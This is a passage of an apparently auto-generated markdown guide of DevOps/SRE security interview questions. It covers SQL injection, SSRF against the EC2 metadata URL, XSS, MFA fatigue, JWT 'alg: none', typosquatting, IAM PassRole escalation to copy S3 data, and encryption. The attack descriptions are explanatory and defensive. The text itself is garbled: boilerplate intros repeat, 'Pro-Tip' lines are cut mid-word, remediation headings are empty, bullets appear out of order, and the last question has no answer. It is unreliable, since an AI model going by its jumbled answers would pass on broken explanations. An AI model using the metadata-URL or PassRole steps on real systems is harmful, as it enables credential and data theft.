This is a classic **SQL Injection (SQLi)** attack. The application is likely taking user input and directly concatenating it into a raw string to build the SQL query (e.g., `SELECT * FROM users WHERE username = '` + input + `'`). The attacker's input alters the structural logic of the query so it always evaluates to true, logging them in as the first user in the table (usually the admin). The fundamental prevention technique is **Parameterized Queries (Prepared Statements)**. Instead of raw concatenation, the developer uses parameter placeholders (e.g., `WHERE username = ?`). The database driver securely sends the query structure and the user input separately. The database treats the input strictly as literal data, completely neutralizing any malicious SQL meta-characters. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: This is a classic SQL Injection (SQLi) attack. The application is likely taking user input and directly concatenating it into a ra.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: This is a classic SQL Injection (SQLi) attack. The application is likely taking user input and
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-164-security-q23-a-cloud-native-application-hosted-on-aws-ec2-allows-users-to-input-a-url-and-the-server-fetches-the-image-at-that-url-to-generate-a-thumbnail-an-attacker-inputs-http-169254169254-latest-meta-data-iam-security-credentials-what-is-this-attack-called-and-how-do-you-mitigate-it-at-the-infrastructure-level-l3"></a>
### 164. Security Q23: A cloud-native application hosted on AWS EC2 allows users to input a URL and the server fetches the image at that URL to generate a thumbnail An attacker inputs http//169254169254/latest/meta-data/iam/security-credentials/ What is this attack called and how do you mitigate it at the infrastructure level [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Security` • `Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Security` `Security` `L3` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"A cloud-native application hosted on AWS EC2 allows users to input a URL, and the server fetches the image at that URL to generate a thumbnail. An attacker inputs `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. What is this attack called, and how do you mitigate it at the infrastructure level?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our DevSecOps implementation, we solved this by introducing automated security quality gates. The interviewer is testing: Server-Side Request Forgery (SSRF), IMDSv1 vs IMDSv2, cloud metadata risks.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

This is a **Server-Side Request Forgery (SSRF)** attack. The attacker is tricking the server into making an HTTP request on their behalf to the internal AWS Instance Metadata Service (IMDS). Because the request originates from the EC2 instance itself, it succeeds, and the server dutifully returns the instance's highly privileged, temporary IAM credentials to the attacker. **Infrastructure Mitigation:** While input validation is necessary, the defense-in-depth infrastructure fix is to enforce **IMDSv2 (Instance Metadata Service Version 2)** on the EC2 instances. IMDSv2 requires a specific `PUT` request containing a secret token header before it responds to any `GET` requests. A basic SSRF vulnerability typically only allows an attacker to forge simple `GET` requests, rendering the attack against the metadata service useless. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: This is a Server-Side Request Forgery (SSRF) attack. The attacker is tricking the server into making an HTTP request on their beha.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: This is a Server-Side Request Forgery (SSRF) attack. The attacker is tricking the server into m
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-165-security-q24-define-cross-site-scripting-xss-and-explain-the-difference-between-stored-and-reflected-xss-l2"></a>
### 165. Security Q24: Define Cross-Site Scripting (XSS) and explain the difference between Stored and Reflected XSS [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Define Cross-Site Scripting (XSS) and explain the difference between Stored and Reflected XSS."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Least-privilege access, encrypted secrets in transit/at rest, and continuous vulnerability scanning are foundational. The interviewer is testing: Web client-side vulnerabilities, content security policy (CSP), output encoding.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

**Cross-Site Scripting (XSS)** is a vulnerability where an attacker injects malicious client-side JavaScript into a website. When a victim visits the site, their browser executes the attacker's script, typically stealing session cookies or performing actions on the victim's behalf.

- **Stored XSS (Persistent):** The attacker injects the malicious script directly into the application's database (e.g., by posting it in a blog comment section). Every user who views that comment section will automatically execute the payload. It is the most dangerous form.
- **Reflected XSS (Non-Persistent):** The malicious script is embedded entirely within a crafted URL parameter (e.g., `example.com/search?q=alert('XSS')`). The attacker must trick the victim into clicking this specific link. The server reflects the input back in the HTML response without storing it.

##### 2️⃣ Remediation & Permanent Safeguards

---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Stored XSS (Persistent): The attacker injects the malicious script directly into the application's database (e.g., by posting it i.

#### ⏱️ 60-Second Elevator Pitch Summary

- Stored XSS (Persistent): The attacker injects the malicious script directly into the application'...
- Reflected XSS (Non-Persistent): The malicious script is embedded entirely within a crafted URL pa...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-166-security-q25-an-employee-is-repeatedly-bombarded-with-mfa-push-notifications-on-their-phone-at-2-am-exhausted-they-finally-click-approve-just-to-make-it-stop-what-is-this-attack-l1"></a>
### 166. Security Q25: An employee is repeatedly bombarded with MFA push notifications on their phone at 2 AM Exhausted they finally click Approve just to make it stop What is this attack [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `Security` • `Security` | **Type:** `Core Fundamentals [L1]`

**Tags:** `Security` `Security` `L1` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"An employee is repeatedly bombarded with MFA push notifications on their phone at 2 AM. Exhausted, they finally click "Approve" just to make it stop. What is this attack?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Security in modern DevOps must be automated into the pipeline rather than bolted on after deployment. The interviewer is testing: MFA Fatigue (Prompt Bombing), human-centric security flaws.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

This is called an **MFA Fatigue** attack (or MFA Prompt Bombing). Attackers already possess the user's compromised password. They intentionally trigger the application to send dozens or hundreds of MFA push notifications to the user's mobile device, hoping the victim will eventually click "Approve" out of annoyance, fatigue, or by accident. **Mitigation:** Implement "Number Matching" MFA, where the login screen displays a 2-digit number that the user must physically type into their authenticator app to approve the request, making accidental or fatigue-based approvals impossible. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: This is called an MFA Fatigue attack (or MFA Prompt Bombing)..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: This is called an MFA Fatigue attack (or MFA Prompt Bombing).
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-167-security-q26-your-application-uses-stateless-json-web-tokens-jwt-for-authentication-during-a-security-review-you-notice-the-application-accepts-tokens-with-the-header-alg-none-why-is-this-a-catastrophic-vulnerability-l3"></a>
### 167. Security Q26: Your application uses stateless JSON Web Tokens (JWT) for authentication During a security review you notice the application accepts tokens with the header {alg none} Why is this a catastrophic vulnerability [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Security` • `Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Security` `Security` `L3` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Your application uses stateless JSON Web Tokens (JWT) for authentication. During a security review, you notice the application accepts tokens with the header `{"alg": "none"}`. Why is this a catastrophic vulnerability?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I respond to this security vulnerability, I emphasize immediate blast-radius containment. The interviewer is testing: JWT structural flaws, cryptographic bypasses, token validation libraries.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

A JWT consists of three parts: Header, Payload, and Signature. The Signature is what guarantees the token hasn't been tampered with. The Header dictates what cryptographic algorithm was used to create the signature (e.g., `HS256` or `RS256`). If an application's JWT parsing library accepts the `alg: none` header, an attacker can simply decode a valid JWT, change the payload data (e.g., elevating their `role` from `user` to `admin`), strip the signature entirely, set the algorithm to `none`, and send it back. The server will parse the header, see "none", decide it doesn't need to mathematically verify a signature, and grant full admin access based on the forged payload. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: A JWT consists of three parts: Header, Payload, and Signature. The Signature is what guarantees the token hasn't been tampered wit.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: A JWT consists of three parts: Header, Payload, and Signature. The Signature is what guarantees
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-168-security-q27-a-developer-accidentally-mistypes-a-python-package-installing-command-as-pip-install-request-instead-of-requests-the-installation-succeeds-but-the-application-begins-acting-strangely-what-attack-vector-just-occurred-l2"></a>
### 168. Security Q27: A developer accidentally mistypes a Python package installing command as pip install request instead of requests The installation succeeds but the application begins acting strangely What attack vector just occurred [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"A developer accidentally mistypes a Python package installing command as `pip install request` instead of `requests`. The installation succeeds, but the application begins acting strangely. What attack vector just occurred?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our DevSecOps implementation, we solved this by introducing automated security quality gates. The interviewer is testing: Supply Chain Attacks, Typosquatting, package dependencies.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

This is a software supply chain attack known as **Typosquatting**. Malicious actors purposefully publish packages to popular public repositories (PyPI, NPM, RubyGems) with names intentionally misspelled slightly differently than highly popular libraries (e.g., `request` vs `requests`, or `react-dom` vs `reactdom`). If a developer makes a typo, they inadvertently download and execute the attacker's malicious code directly inside the corporate network. **Mitigation:** Enforce the use of a private, curated internal artifact repository (like Artifactory or Nexus) that caches approved public packages, preventing developers from pulling arbitrary unvetted code directly from the public internet. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: This is a software supply chain attack known as Typosquatting..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: This is a software supply chain attack known as Typosquatting.
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-169-security-q28-how-does-a-distributed-denial-of-service-ddos-attack-work-and-what-is-the-primary-role-of-a-service-like-cloudflare-or-aws-shield-in-stopping-it-l1"></a>
### 169. Security Q28: How does a Distributed Denial of Service (DDoS) attack work and what is the primary role of a service like Cloudflare or AWS Shield in stopping it [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `Security` • `Security` | **Type:** `Core Fundamentals [L1]`

**Tags:** `Security` `Security` `L1` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"How does a Distributed Denial of Service (DDoS) attack work, and what is the primary role of a service like Cloudflare or AWS Shield in stopping it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Least-privilege access, encrypted secrets in transit/at rest, and continuous vulnerability scanning are foundational. The interviewer is testing: Volumetric attacks, Edge network absorption, Anycast routing.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

In a **DDoS attack**, an attacker commands a massive botnet of compromised devices to simultaneously send millions of junk requests (or pure network traffic) at a target server, completely overwhelming its CPU, memory, or network bandwidth, taking it offline for legitimate users. Services like Cloudflare or AWS Shield mitigate this using **Anycast Edge Networks**. They sit in front of the application. Because their global networks possess far more bandwidth than any single botnet, they simply absorb the massive volume of traffic, intelligently filter out the junk packets at their edge nodes around the world, and only forward the legitimate, clean traffic back to the origin server. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: In a DDoS attack, an attacker commands a massive botnet of compromised devices to simultaneously send millions of junk requests (o.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: In a DDoS attack, an attacker commands a massive botnet of compromised devices to simultaneousl
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-170-security-q29-you-notice-thousands-of-failed-login-attempts-per-minute-hitting-your-api-v1-login-endpoint-from-hundreds-of-different-rotating-ip-addresses-how-do-you-defend-against-this-brute-force-attack-l2"></a>
### 170. Security Q29: You notice thousands of failed login attempts per minute hitting your /api/v1/login endpoint from hundreds of different rotating IP addresses How do you defend against this brute-force attack [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"You notice thousands of failed login attempts per minute hitting your `/api/v1/login` endpoint from hundreds of different rotating IP addresses. How do you defend against this brute-force attack?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Security in modern DevOps must be automated into the pipeline rather than bolted on after deployment. The interviewer is testing: Distributed brute forcing, Rate Limiting, WAF managed rules, CAPTCHA.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Because the attacker is rotating IPs (a distributed brute force or credential stuffing attack), simply blocking a single IP address will not work.

- **Application Rate Limiting:** Implement strict rate limits based on the *username* being attempted, locking the account temporarily after 5 failed attempts (with careful consideration to avoid intentional denial-of-service against legitimate users).
- **WAF Rules:** Deploy a Web Application Firewall with managed rules to detect and block traffic from known malicious botnets, VPNs, and Tor exit nodes.
- **Friction/Challenges:** If behavior appears suspicious but isn't definitively malicious, inject a CAPTCHA challenge before processing the login request to mathematically prove the client is a human.

##### 2️⃣ Remediation & Permanent Safeguards

---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Application Rate Limiting: Implement strict rate limits based on the *username* being attempted, locking the account temporarily a.

#### ⏱️ 60-Second Elevator Pitch Summary

- Application Rate Limiting: Implement strict rate limits based on the *username* being attempted, ...
- WAF Rules: Deploy a Web Application Firewall with managed rules to detect and block traffic from ...
- Friction/Challenges: If behavior appears suspicious but isn't definitively malicious, inject a CA...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-171-security-q30-you-need-to-store-highly-sensitive-customer-data-like-social-security-numbers-in-a-database-explain-the-envelope-encryption-architecture-using-aws-kms-l3"></a>
### 171. Security Q30: You need to store highly sensitive customer data (like Social Security Numbers) in a database Explain the Envelope Encryption architecture using AWS KMS [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Security` • `Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Security` `Security` `L3` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"You need to store highly sensitive customer data (like Social Security Numbers) in a database. Explain the "Envelope Encryption" architecture using AWS KMS."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I respond to this security vulnerability, I emphasize immediate blast-radius containment. The interviewer is testing: Envelope encryption, Data Keys (DEK) vs Master Keys (CMK), performance optimization.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Cryptographically encrypting gigabytes of data directly via an AWS KMS API call is incredibly slow, expensive, and subject to strict network payload limits (4KB max).

- The application asks AWS KMS to generate a **Data Encryption Key (DEK)**. KMS returns two versions of this DEK: one in plainly usable text, and one encrypted by the highly secure KMS Master Key (Customer Managed Key).
- The application uses the *plaintext* DEK to locally and rapidly encrypt the massive payload using a fast symmetric algorithm like AES-GCM.
- The application then immediately deletes the plaintext DEK from RAM.

##### 2️⃣ Remediation & Permanent Safeguards

**Envelope Encryption** solves this by using two tiers of keys: To decrypt, the application reads the encrypted envelope from the database, sends it to KMS to be decrypted, gets the plaintext DEK back, decrypts the payload locally, and discards the DEK again. ---

- The application stores the newly encrypted payload *alongside* the KMS-encrypted version of the DEK in the database (the DEK acts as an "envelope" for the payload).

#### 🎯 Key Architectural Takeaway
> Pro-Tip: The application asks AWS KMS to generate a Data Encryption Key (DEK). KMS returns two versions of this DEK: one in plainly usable .

#### ⏱️ 60-Second Elevator Pitch Summary

- The application asks AWS KMS to generate a Data Encryption Key (DEK). KMS returns two versions of...
- The application uses the *plaintext* DEK to locally and rapidly encrypt the massive payload using...
- The application then immediately deletes the plaintext DEK from RAM.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-172-security-q31-a-legacy-application-requires-a-long-lived-database-password-hardcoded-in-its-configuration-file-you-cannot-change-the-application-code-how-do-you-implement-a-secure-secret-rotation-strategy-l2"></a>
### 172. Security Q31: A legacy application requires a long-lived database password hardcoded in its configuration file You cannot change the application code How do you implement a secure secret rotation strategy [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"A legacy application requires a long-lived database password hardcoded in its configuration file. You cannot change the application code. How do you implement a secure secret rotation strategy?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our DevSecOps implementation, we solved this by introducing automated security quality gates. The interviewer is testing: Vault Agent, configuration templating, secret rotation without code changes.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

If the application absolutely cannot fetch secrets dynamically via an SDK, you use an external templating tool alongside a secrets manager, such as **Vault Agent Templates** or **AWS Secrets Manager with a sidecar**.

- The secret (password) is stored centrally in the Vault.
- An agent process runs alongside the legacy application container.
- The agent watches the Vault. When the secret is rotated in the Vault, the agent pulls the new password, injects it into a raw configuration file template (e.g., `config.ini.tmpl`), and renders the new static `config.ini` to the disk.

##### 2️⃣ Remediation & Permanent Safeguards

---

- The agent then sends a signal (e.g., `SIGHUP`) or restarts the legacy application process, forcing it to seamlessly reload the new configuration file containing the updated password from disk.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: The secret (password) is stored centrally in the Vault..

#### ⏱️ 60-Second Elevator Pitch Summary

- The secret (password) is stored centrally in the Vault.
- An agent process runs alongside the legacy application container.
- The agent watches the Vault. When the secret is rotated in the Vault, the agent pulls the new pas...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-173-security-q32-what-is-a-zero-trust-architecture-l1"></a>
### 173. Security Q32: What is a Zero Trust Architecture [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `Security` • `Security` | **Type:** `Core Fundamentals [L1]`

**Tags:** `Security` `Security` `L1` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"What is a "Zero Trust Architecture"?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Least-privilege access, encrypted secrets in transit/at rest, and continuous vulnerability scanning are foundational. The interviewer is testing: Modern network security paradigms, perimeter-less security.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

**Zero Trust** is a security model built on the principle of "Never trust, always verify." Traditionally, corporate networks used a "Castle and Moat" design: anyone outside the VPN was a threat, but anyone inside the network (or on the VPN) was trusted by default. Zero Trust assumes the network is *already* compromised. It dictates that no entity (user, device, or microservice)—whether deeply internal or remote—is trusted by default. Every single request, between any two services, must be explicitly authenticated, authorized, and continuously validated before access is granted. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Zero Trust is a security model built on the principle of "Never trust, always verify.".

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Zero Trust is a security model built on the principle of "Never trust, always verify."
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-174-security-q33-in-kubernetes-what-is-a-container-escape-vulnerability-and-why-is-running-a-container-with-privileged-true-extremely-dangerous-l3"></a>
### 174. Security Q33: In Kubernetes what is a Container Escape vulnerability and why is running a container with privileged true extremely dangerous [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Security` • `Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Security` `Security` `L3` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"In Kubernetes, what is a "Container Escape" vulnerability, and why is running a container with `privileged: true` extremely dangerous?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Security in modern DevOps must be automated into the pipeline rather than bolted on after deployment. The interviewer is testing: Linux namespaces, cgroups, kernel capabilities, privileged containers.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Containers are not true virtual machines; they are merely isolated processes sharing the same underlying Linux host kernel, governed by namespaces and cgroups. A **Container Escape** occurs when an attacker breaks out of this isolation and gains direct root access to the underlying host node (and thereby all other containers on that node). Running a container with `privileged: true` is inherently dangerous because it disables almost all security namespace isolation. It grants the container full access to the host's devices (`/dev`) and allows it to execute unrestricted system calls to the kernel. If a process inside a privileged container runs as root, and an attacker compromises that process, they are effectively `root` on the host Kubernetes node itself. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Containers are not true virtual machines; they are merely isolated processes sharing the same underlying Linux host kernel, govern.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Containers are not true virtual machines; they are merely isolated processes sharing the same u
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-175-security-q34-an-iam-user-has-ec2runinstances-permissions-but-they-do-not-have-permissions-to-read-s3-buckets-however-they-also-have-the-iampassrole-permission-for-an-existing-s3admin-ec2-role-explain-how-this-user-can-escalate-their-privileges-to-steal-s3-data-l2"></a>
### 175. Security Q34: An IAM user has ec2RunInstances permissions but they do NOT have permissions to read S3 buckets However they also have the iamPassRole permission for an existing S3Admin EC2 Role Explain how this user can escalate their privileges to steal S3 data [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"An IAM user has `ec2:RunInstances` permissions, but they do NOT have permissions to read S3 buckets. However, they also have the `iam:PassRole` permission for an existing `S3Admin` EC2 Role. Explain how this user can escalate their privileges to steal S3 data."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I respond to this security vulnerability, I emphasize immediate blast-radius containment. The interviewer is testing: IAM PassRole abuse, privilege escalation vectors.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

This is a classic IAM privilege escalation path.

- Launch a new EC2 instance via the CLI.
- During the launch, they "pass" the `S3Admin` role to the instance, effectively attaching it.
- Once the instance boots, they SSH into it (or execute commands via User Data).

##### 2️⃣ Remediation & Permanent Safeguards

The user cannot read the S3 bucket directly. However, because they possess `iam:PassRole` along with `ec2:RunInstances`, they can: ---

- From inside the instance, they execute `aws s3 cp` commands. The command succeeds because the instance is using the temporary credentials of the highly privileged `S3Admin` role. The user bypasses their own restrictions and steals the data via the machine's identity.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Launch a new EC2 instance via the CLI..

#### ⏱️ 60-Second Elevator Pitch Summary

- Launch a new EC2 instance via the CLI.
- During the launch, they "pass" the S3Admin role to the instance, effectively attaching it.
- Once the instance boots, they SSH into it (or execute commands via User Data).

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-176-security-q35-contrast-symmetric-and-asymmetric-encryption-and-explain-when-you-would-use-each-l1"></a>
### 176. Security Q35: Contrast Symmetric and Asymmetric encryption and explain when you would use each [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `Security` • `Security` | **Type:** `Core Fundamentals [L1]`

**Tags:** `Security` `Security` `L1` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Contrast Symmetric and Asymmetric encryption, and explain when you would use each."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our DevSecOps implementation, we solved this by introducing automated security quality gates. The interviewer is testing: Cryptographic primitives, performance vs key exchange.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

**Typical Use Case:** They are almost always used together. Asymmetric encryption is used briefly at the start of a connection to securely exchange a temporary Symmetric key, which is then used for the fast, bulk data transfer (this is exactly how HTTPS/TLS works).

- **Symmetric Encryption** (e.g., AES) uses the *exact same key* to both encrypt and decrypt data. It is extremely fast and computationally cheap, making it perfect for encrypting large volumes of data (like files on a hard drive or massive network payloads). However, securely sharing that single key across the internet is difficult.
- **Asymmetric Encryption** (e.g., RSA) uses a mathematically linked *pair of keys* (Public to encrypt, Private to decrypt). It solves the key-sharing problem because you can distribute the Public key freely. However, the complex math makes it extremely slow and CPU-intensive.

##### 2️⃣ Remediation & Permanent Safeguards

---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Symmetric Encryption (e.g., AES) uses the *exact same key* to both encrypt and decrypt data. It is extremely fast and computationa.

#### ⏱️ 60-Second Elevator Pitch Summary

- Symmetric Encryption (e.g., AES) uses the *exact same key* to both encrypt and decrypt data. It i...
- Asymmetric Encryption (e.g., RSA) uses a mathematically linked *pair of keys* (Public to encrypt,...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-177-security-q36-your-web-applications-frontend-hosted-on-appexamplecom-makes-an-api-call-to-apiexamplecom-the-browser-blocks-the-request-with-a-cors-error-a-developer-fixes-it-by-setting-access-control-allow-origin-on-the-api-server-why-is-this-a-major-security-risk-if-the-api-uses-cookie-based-authentication-l2"></a>
### 177. Security Q36: Your web applications frontend hosted on appexamplecom makes an API call to apiexamplecom The browser blocks the request with a CORS Error A developer fixes it by setting Access-Control-Allow-Origin * on the API server Why is this a major security risk if the API uses cookie-based authentication [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Your web application's frontend hosted on `app.example.com` makes an API call to `api.example.com`. The browser blocks the request with a "CORS Error". A developer fixes it by setting `Access-Control-Allow-Origin: *` on the API server. Why is this a major security risk if the API uses cookie-based authentication?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Least-privilege access, encrypted secrets in transit/at rest, and continuous vulnerability scanning are foundational. The interviewer is testing: Cross-Origin Resource Sharing (CORS), CSRF, browser security models.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

